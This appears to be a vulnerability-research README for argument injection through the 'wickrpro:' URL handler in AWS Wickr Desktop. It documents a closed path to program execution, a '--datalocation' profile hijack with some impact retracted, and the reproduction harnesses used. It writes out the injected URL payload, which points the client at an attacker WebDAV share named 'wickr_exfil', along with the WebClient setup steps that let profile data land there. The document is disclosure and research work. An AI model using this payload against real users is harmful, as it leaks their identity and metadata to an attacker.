# `wickrpro://` argument injection — W37 / W37b

Target: **AWS Wickr Desktop 6.72.20.0** (Windows x64), Qt 6.9.2, Qt WebEngine 130.0.6723.192
(declared patch level 139.0.7258.67).

This bundle consolidates the two waves that, together, cover the `wickrpro:` custom-protocol
argument-injection surface on the desktop client: the program-execution attempt (W37, **closed**)
and the follow-on `--datalocation` profile hijack (W37b, **measured, impact retracted**). All
artifacts are reproduced from `scratch/w37/`; the verdicts are the source of truth.

---

## TL;DR (read before reporting)

* **Injection is REAL.** The shell handler is `"…\WickrPro.exe" "%1"` with no `--` separator,
  so a `wickrpro:x" <tokens>` URL lands the tokens in argv.
* **It does not reach program execution.** `--`-prefixed Chromium switches are killed by
  `QCommandLineParser::process()` (unknown-option dialog → app exits); `/`-prefixed ones pass Qt
  but QtWebEngine's `initCommandLine` drops app argv without a `--webEngineArgs` separator (the
  mechanism pinned by W39). The marker binary never ran. **PATH CLOSED.**
* **The only registered option reachable through it is `--datalocation`.** That yields metadata +
  identity disclosure into an attacker-named plaintext-INI profile — **not** credential capture,
  **not** message bodies, **not** key material. The `regionBaseURL` interception impact was
  tested and **retracted** (the client resolves its own region and the redirected traffic is empty).
  The local–local repro is measured. **The remote-victim topology (WebDAV delivery, W37b gates #4)
  was previously `[I]` and is what `repro_webdav.py` exists to settle.**

---

## Findings (source of truth)

| file | wave | verdict |
|---|---|---|
| [`W37-argv-injection-to-exec-VERDICT.md`](W37-argv-injection-to-exec-VERDICT.md) | W37 | **PATH CLOSED** — injection reaches argv but no child-process switch fires. Single-instance suppression, Qt parser rejection, and `initCommandLine` argv drop each close a sub-path. |
| [`W37b-datalocation-profile-hijack.md`](W37b-datalocation-profile-hijack.md) | W37b | **MEASURED, RETRACTED in part.** `--datalocation` exposes `last_successful_user` + `[JS]` bridge metadata and gives a config-tampering surface. The `regionBaseURL` / `webViewAddress` interception claims were refuted by follow-up testing — see the CORRECTED box at the top of the note. |

---

## Reproduction harnesses

There are **two topologies**, by intent. Pick the one that matches the question you are asking.

| file | topology | what it answers |
|---|---|---|
| `repro_server.py` | **local–local** — `--datalocation` points at a local attacker directory on the same machine that clicks the link. Quick reproduction of the metadata/identity disclosure. Stdlib only. | "Does `--datalocation` expose the profile at all?" (measured: yes, ceiling = metadata + identity) |
| `repro_webdav.py` | **remote-victim** — `--datalocation` points at a UNC path backed by the attacker's WebDAV share. This is W37b **gates #4**, previously `[I]` (untested). | "Does WickrPro write its profile (esp. `wickr_db.sqlite`) across the network onto an attacker-controlled WebDAV share?" `[M]` or measured-DEAD. |

### `repro_server.py` — local–local quick repro

```
python repro_server.py --port 8099 [--dir C:\path\with\no\spaces]
```

Preconditions, all measured — the chain silently fails without them:

* WickrPro.exe must **not** already be running (a live instance makes the shell suppress the new
  process entirely, so the injected argv never materialises).
* The victim must accept the browser's external-protocol dialog.
* `--datalocation` needs the target directory to already exist (the script creates it) and the
  path must contain **no spaces** (the shell re-splits argv on them).

### `repro_webdav.py` — remote-victim, WebDAV delivery (W37b gates #4)

Requires `pip install wsgidav cheroot` (tested with wsgidav 4.3.5 + cheroot 11.1.2 on Python 3.14).
The harness stands up two listeners: an HTTP landing page (`--port`) for the link the victim
clicks, and a WebDAV share (`--dav-port`) exposing `--dir` as `/<share>/`. The injected payload
becomes `wickrpro:x" --datalocation \\<host>@<dav-port>\DavWWWRoot\<share>` — `DavWWWRoot` is the
literal token Windows WebClient's mini-redirector recognises.

```
python repro_webdav.py [--port 8099] [--dav-port 8080]
                       [--host <lan-ip>] [--share wickr_exfil]
                       [--dir <backend-dir-with-no-spaces>]
```

Server-side smoke test (already passing on this build): `OPTIONS /wickr_exfil/` returns
`DAV: 1,2` + `MS-Author-Via: DAV` + the full WebDAV verb allowlist — i.e. wsgidav answers the
probe WebClient issues first. The remaining questions are real-machine:

1. On the **victim**, `net use W: \\<host>@<dav-port>\DavWWWRoot\wickr_exfil` succeeds (WebClient
   service running, firewall open on both ports).
2. After the victim clicks the link from the page with WickrPro closed, the client honours the
   UNC `--datalocation` and writes its profile onto the share. The watcher threads print each
   new file (with SQLite/magic detection), every `settings` change, and each `[JS]` metadata
   field as it lands. If `wickr_db.sqlite` is created with a real `SQLite format 3` header, that
   is the gate flipping to `[M]`; if it errors out, that is measured-DEAD with the reason.

Preconditions on the victim (in addition to W37's):

* `WebClient` service must be running — `Start-Service WebClient` / `net start WebClient`. It is
  `Manual` / trigger-start by default.
* Anonymous, plain-HTTP delivery — no TLS, no `BasicAuthLevel` registry change required. (If you
  switch the share to Basic auth later, set
  `HKLM\SYSTEM\…\WebClient\Parameters\BasicAuthLevel = 2` and restart WebClient.)

## Evidence

| file | what it shows |
|---|---|
| `unknown-option-dialog.png` | The modal `QCommandLineParser::process()` error — *"Unknown option 'baseURL'."* — that kills the app on any `--`-prefixed Chromium switch. This is why the `--` form is dead. |

## Test harnesses

| file | purpose |
|---|---|
| `trial.ps1` | Launch WickrPro with chosen argv, record the process tree and marker hits, then terminate only what it started. |
| `fireurl.ps1` | Fire a `wickrpro:` URL through ShellExecute — the same call a browser makes after the dialog. |
| `optsweep.ps1` | Determines which options this build actually registers, using the error dialog as the oracle ("Unknown option" = not registered, "Missing value after" = registered). |
| `wins2.ps1` | Enumerate a process's top-level windows and dialog child-control text. |
| `shotwin.ps1` | Capture a single window's rectangle only (not the desktop). |
| `marker.cs` | Marker binary — logs its own `GetCommandLineW()` + pid/ppid and exits. Build: `csc.exe /platform:x64 /reference:System.Management.dll marker.cs`. Never fired: no switch reaches child-process creation. |
| `auth_server.py` | Auth-flow probe used to prove the login flow does **not** use `regionBaseURL`. Only ever exercised with a deliberately wrong dummy password. |
| `poc_page.html` | Bridge-reachability probe page, written for the `webViewAddress` hypothesis that was subsequently **refuted**. Kept for the record. |

## Analysis tools (reusable for other waves)

| file | purpose |
|---|---|
| `xref.py` | Fast rip-relative xref finder for large PEs. Vectorised (numpy); handles the 196 MB `Qt6WebEngineCore.dll`. `python xref.py <pe> <file-offset>…` |
| `fnbounds.py` | Function bounds from the PE exception directory (`.pdata`) + direct callers via E8 rel32. Used to trace the `environment` constant back to its single call site. |
| `swsweep.py` | Chromium switch-string presence sweep (exact, NUL-terminated). |
| `u16sweep.py` | Same for UTF-16 (Qt `QStringLiteral` option names). |
| `optdump.py` | Dumps the UTF-16 option-name table out of `.rdata`. |
| `singleton.py` | Single-instance mechanism identification (SingleApplication vs Chromium ProcessSingleton) + import-thunk caller scan. |
| `tempwatch.py` | Read-only watcher for `temp/`; records name, size and format magic only (never content). Used to show attachments are encrypted at rest. |

---

## Scope reminder

Not RCE. Not credential theft. Not message content, attachment plaintext, or key material —
each measured, not assumed. Two claims made mid-investigation were retracted: the
`regionBaseURL` interception impact and the `webViewAddress` → WebView binding. Both retractions
are documented in the notes above.
